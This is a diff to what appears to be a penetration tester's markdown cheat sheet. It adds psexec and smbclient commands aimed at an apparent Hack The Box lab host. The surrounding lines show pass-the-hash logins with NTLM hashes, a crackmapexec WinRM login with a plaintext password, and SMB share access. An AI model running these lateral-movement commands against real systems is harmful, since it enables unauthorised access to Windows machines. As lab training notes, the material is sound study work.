@@ -298,7 +298,7 @@ proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv
 ## psexec
 ```bash
 psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247
-
+psexec.py active.htb/administrator@10.129.193.5
 
 
 When psexec not working
@@ -444,6 +444,8 @@ smb: \> mget *
 
 smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
 smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+smbclient //10.129.193.5/Users -U active.htb/svc_tgs
+
 
 # Download large volume
 > tarmode
